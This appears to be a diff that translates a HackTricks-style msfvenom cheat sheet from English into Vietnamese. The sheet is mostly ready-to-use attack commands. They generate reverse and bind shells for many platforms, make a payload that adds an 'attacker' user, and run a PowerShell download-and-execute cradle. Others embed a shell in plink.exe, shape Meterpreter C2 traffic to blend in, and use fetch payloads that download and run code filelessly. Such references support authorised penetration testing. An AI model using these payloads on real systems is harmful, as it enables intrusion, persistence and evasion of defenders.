@@ -1,25 +1,25 @@
-# MSFVenom - CheatSheet
+# MSFVenom - Bảng tra cứu
 
 {{#include ../../banners/hacktricks-training.md}}
 
 ---
 
-## Basic msfvenom
+## msfvenom cơ bản
 
 `msfvenom -p <PAYLOAD> -e <ENCODER> -f <FORMAT> -i <ENCODE COUNT> LHOST=<IP>`
 
-Use `-a` to select the payload architecture and `--platform` to select its target platform.<sup>[[1]](#references)</sup>
+Dùng `-a` để chọn kiến trúc của payload và `--platform` để chọn nền tảng mục tiêu của payload.<sup>[[1]](#references)</sup>
 
-## Listing
+## Liệt kê
 
 ```bash
 msfvenom -l payloads #Payloads
 msfvenom -l encoders #Encoders
 ```
 
-These commands list the payload and encoder modules available in the installed framework.<sup>[[1]](#references)</sup>
+Các lệnh này liệt kê những module payload và encoder có sẵn trong framework đã cài đặt.<sup>[[1]](#references)</sup>
 
-## Common params when creating a shellcode
+## Các tham số phổ biến khi tạo shellcode
 
 ```bash
 -b "\x00\x0a\x0d"
@@ -29,11 +29,11 @@ EXITFUNC=thread
 PrependSetuid=True #Use this to create a shellcode that will execute something with SUID
 ```
 
-The flags shown here select bad characters, output format, encoder, and encoding iterations.<sup>[[1]](#references)</sup>
+Các flag được hiển thị ở đây dùng để chọn ký tự không hợp lệ, định dạng đầu ra, encoder và số lần mã hóa.<sup>[[1]](#references)</sup>
 
-## HTTP(S) Meterpreter traffic shaping
+## Định hình lưu lượng HTTP(S) Meterpreter
 
-Metasploit 6.5 added the `MALLEABLEC2` option to staged and stageless reverse HTTP(S) Meterpreter payloads. The profile can change URIs, user agents, request/response headers, connection-ID placement and supported body encodings/wrappers. Both the generated payload and its handler must load the **same local profile**. A staged payload's initial request for the Meterpreter stage is not shaped, so prefer a stageless payload such as `windows/x64/meterpreter_reverse_https` when the first request must also match the profile.<sup>[[3]](#references)</sup>
+Metasploit 6.5 bổ sung tùy chọn `MALLEABLEC2` cho payload reverse HTTP(S) Meterpreter dạng staged và stageless. Profile có thể thay đổi URI, user agent, header request/response, vị trí connection ID và các kiểu mã hóa/wrapper body được hỗ trợ. Cả payload được tạo và handler của nó đều phải tải **cùng một profile cục bộ**. Request đầu tiên của payload staged để lấy Meterpreter stage không được định hình, vì vậy hãy ưu tiên payload stageless như `windows/x64/meterpreter_reverse_https` khi request đầu tiên cũng cần khớp với profile.<sup>[[3]](#references)</sup>
 
 ```bash
 msfvenom -p windows/x64/meterpreter_reverse_https \
@@ -41,7 +41,7 @@ msfvenom -p windows/x64/meterpreter_reverse_https \
   -f exe -o reverse_https.exe
 ```
 
-Configure the matching handler with the identical payload and profile:<sup>[[3]](#references)</sup>
+Cấu hình handler phù hợp với payload và profile giống hệt:<sup>[[3]](#references)</sup>
 
 ```text
 use exploit/multi/handler
@@ -52,7 +52,7 @@ set MALLEABLEC2 /opt/profiles/web.profile
 run
 ```
 
-Only the directives documented as implemented affect traffic; unsupported profile blocks may parse successfully while having no effect.<sup>[[3]](#references)</sup>
+Chỉ các chỉ thị được ghi nhận là đã triển khai mới ảnh hưởng đến lưu lượng; các khối cấu hình không được hỗ trợ vẫn có thể được phân tích cú pháp thành công nhưng không có tác dụng.<sup>[[3]](#references)</sup>
 
 ## **Windows**
 
@@ -68,7 +68,7 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port)
 msfvenom -p windows/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f exe > bind.exe
 ```
 
-### Create User
+### Tạo người dùng
 
 ```bash
 msfvenom -p windows/adduser USER=attacker PASS=attacker@123 -f exe > adduser.exe
@@ -80,7 +80,7 @@ msfvenom -p windows/adduser USER=attacker PASS=attacker@123 -f exe > adduser.exe
 msfvenom -p windows/shell/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > prompt.exe
 ```
 
-### **Execute Command**
+### **Thực thi lệnh**
 
 ```bash
 msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('http://IP/nishang.ps1')\"" -f exe > pay.exe
@@ -93,9 +93,9 @@ msfvenom -a x86 --platform Windows -p windows/exec CMD="net localgroup administr
 msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > encoded.exe
 ```
 
-> **Encoding is not AV evasion:** encoders such as `x86/shikata_ga_nai` are primarily useful for satisfying bad-character constraints. Repeated encoding is not a reliable AV-evasion technique.<sup>[[1]](#references)</sup>
+> **Encoding không phải là AV evasion:** các encoder như `x86/shikata_ga_nai` chủ yếu hữu ích để đáp ứng các ràng buộc về bad-character. Encoding lặp lại không phải là kỹ thuật AV evasion đáng tin cậy.<sup>[[1]](#references)</sup>
 
-### Embedded inside executable
+### Nhúng bên trong tệp thực thi
 
 ```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -x /usr/share/windows-binaries/plink.exe -f exe -o plinkmeter.exe
@@ -136,7 +136,7 @@ msfvenom -p osx/x86/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f ma
 msfvenom -p osx/x86/shell_bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f macho > bind.macho
 ```
 
-## **Web Based Payloads**
+## **Payloads dựa trên Web**
 
 ### **PHP**
 
@@ -178,7 +178,7 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f w
 msfvenom -p nodejs/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port)
 ```
 
-## **Script Language payloads**
+## **Payload bằng ngôn ngữ Script**
 
 ### **Perl**
 
@@ -198,11 +198,11 @@ msfvenom -p cmd/unix/reverse_python LHOST=(IP Address) LPORT=(Your Port) -f raw 
 msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.sh
 ```
 
-## Fetch payload adapters
+## Bộ điều hợp fetch payload
 
-Fetch payloads produce a command that makes an available target utility download and execute an underlying native payload. Their names follow `cmd/<platform>/<fetch-protocol>/<served-payload>`; HTTP(S), SMB and TFTP adapters are available, with downloader choices depending on the target platform.<sup>[[2]](#references)</sup>
+Fetch payload tạo ra một lệnh để tiện ích có sẵn trên mục tiêu tải xuống và thực thi payload gốc bên dưới. Tên của chúng theo định dạng `cmd/<platform>/<fetch-protocol>/<served-payload>`; có các bộ điều hợp HTTP(S), SMB và TFTP, với lựa chọn trình tải xuống tùy thuộc vào nền tảng mục tiêu.<sup>[[2]](#references)</sup>
 
-For example, generate a Linux `wget` command that retrieves an x64 Meterpreter payload from port 8080 and connects it back on port 4444:<sup>[[2]](#references)</sup>
+Ví dụ: tạo lệnh `wget` trên Linux để tải payload Meterpreter x64 từ cổng 8080 và kết nối ngược về cổng 4444:<sup>[[2]](#references)</sup>
 
 ```bash
 msfvenom -p cmd/linux/http/x64/meterpreter/reverse_tcp \
@@ -210,7 +210,7 @@ msfvenom -p cmd/linux/http/x64/meterpreter/reverse_tcp \
   LHOST=10.10.10.10 LPORT=4444 -f raw
 ```
 
-Start the **fetch handler** with the same settings; it hosts the generated ELF and also starts the handler for the served Meterpreter payload:<sup>[[2]](#references)</sup>
+Khởi chạy **fetch handler** với cùng các thiết lập; nó lưu trữ ELF đã tạo và đồng thời khởi chạy handler cho Meterpreter payload được phân phối:<sup>[[2]](#references)</sup>
 
 ```text
 use payload/cmd/linux/http/x64/meterpreter/reverse_tcp
@@ -222,13 +222,13 @@ set LPORT 4444
 to_handler
 ```
 
-Useful dependent options include `FETCH_PIPE=true` to emit a shorter HTTP(S) command where supported and `FETCH_FILELESS=shell`, `shell-search`, or `python3.8+` to execute a Linux ELF from an anonymous file descriptor. Fileless modes require Linux kernel 3.17 or later; inspect the exact adapter with `msfvenom -p <FETCH_PAYLOAD> --list-options` because supported combinations vary.<sup>[[2]](#references)</sup>
+Các tùy chọn phụ thuộc hữu ích gồm `FETCH_PIPE=true` để tạo lệnh HTTP(S) ngắn hơn khi được hỗ trợ và `FETCH_FILELESS=shell`, `shell-search` hoặc `python3.8+` để thực thi Linux ELF từ file descriptor ẩn danh. Các chế độ fileless yêu cầu Linux kernel 3.17 trở lên; hãy kiểm tra adapter cụ thể bằng `msfvenom -p <FETCH_PAYLOAD> --list-options` vì các tổ hợp được hỗ trợ sẽ khác nhau.<sup>[[2]](#references)</sup>
 
 
 
 ## References
 
-- [1] [How to use msfvenom](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom/eb69bce6cf0d2ba0e876c57b87793bf31c915bb7)
-- [2] [How to use Fetch Payloads](https://docs.metasploit.com/docs/development/developing-modules/guides/how-to-use-fetch-payloads.html)
+- [1] [Cách sử dụng msfvenom](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom/eb69bce6cf0d2ba0e876c57b87793bf31c915bb7)
+- [2] [Cách sử dụng Fetch Payloads](https://docs.metasploit.com/docs/development/developing-modules/guides/how-to-use-fetch-payloads.html)
 - [3] [Malleable C2 Profiles](https://docs.metasploit.com/docs/using-metasploit/advanced/meterpreter/meterpreter-malleable-c2-profiles.html)
 {{#include ../../banners/hacktricks-training.md}}
